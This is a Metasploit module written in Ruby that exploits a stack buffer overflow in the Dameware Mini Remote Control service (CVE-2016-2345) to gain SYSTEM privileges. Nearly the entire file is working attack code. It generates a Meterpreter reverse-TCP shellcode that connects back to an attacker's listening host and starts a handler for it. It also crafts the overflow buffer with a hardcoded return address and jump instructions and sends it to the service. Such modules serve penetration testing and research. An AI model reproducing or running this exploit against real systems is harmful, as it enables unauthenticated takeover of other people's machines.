require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Dameware Mini Remote Control Buffer Overflow',
        'Description'   => %q{
	A certain message parsing function inside the Dameware Mini Remote Control service 
	does not properly validate the input size of an incoming string before passing it to 
	wsprintfw.  As a result, a specially crafted message can overflow into the bordering 
	format field and subsequently overflow the stack frame. Exploitation of this vulnerability 
	does not require authentication and can lead to SYSTEM level privilege on any system running 
	the dwmrcs daemon. This module has been tested against dwrcs.exe v12.0.0.509.
        },
        'License'       => 'BSD_LICENSE',
        'Author'        => [ 'Mario Ceballos' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ],
	'References'    =>
	[
		[ 'CVE', '2016-2345' ]
	],
      ))
    register_options([
		OptAddress.new('LHOST', [ false, 'Local host to listen on.' ]),
		OptInt.new('LPORT',     [ true,  'Local port to listen on.', 1975])
	], self.class)
  end

  def run

	payload = framework.payloads.create("windows/meterpreter/reverse_tcp")
	shellcode = Msf::Simple::Payload.generate_simple(payload,
		{
			'OptionStr' => "LHOST=#{datastore['LHOST']} LPORT=#{datastore['LPORT']}",
			'ExitFunc'  => "thread",
			'Format'    => 'raw',
			'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
			'Space'    => 500,
		})

	rhost = datastore['LHOST']
	rport = datastore['LPORT']
        handler = client.framework.exploits.create("multi/handler")
        handler.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
        handler.datastore['LHOST']   = rhost
        handler.datastore['LPORT']   = rport
        handler.datastore['InitialAutoRunScript'] = "migrate -f"
        handler.datastore['ExitOnSession'] = false

        handler.exploit_simple(
                'Payload'        => handler.datastore['PAYLOAD'],
                'RunAsJob'       => true
        )


	gw = framework.sessions.get(datastore['SESSION'])
	sock = Rex::Socket::Tcp.create(
		'Comm' => gw,
		'PeerHost' => "127.0.0.1",
		'PeerPort' => 6129
	)

	type = 444.0
	buff =  [0x1130].pack('V')
	buff << Rex::Text.rand_text_alpha_upper(4)
        buff << [type].pack('d')
        buff << [type].pack('d')
	buff << Rex::Text.rand_text_alpha_upper(40 - buff.size)

	sock.put(buff)
	res = sock.get_once

	sploit =  Rex::Text.rand_text_alpha_upper(16)
	sploit << "\x96" * (870 - shellcode.size)
	sploit << shellcode
	sploit << Rex::Text.rand_text_alpha_upper(2)
	sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+8").encode_string
	sploit << [0x42b915].pack('V') # dwrcs.exe v12.0.0.509
	sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "nop").encode_string * 4
	sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-900").encode_string
	sploit << Rex::Text.rand_text_alpha_upper(188)
	sploit << ("%" + "\x00" + "B" + "\x00") * 5

	get = [0x9c44].pack('V')
	get << sploit
	get << "\x00" * 0x200

	sock.put(get)
	sock.get_once
	sock.get_once

  end
end
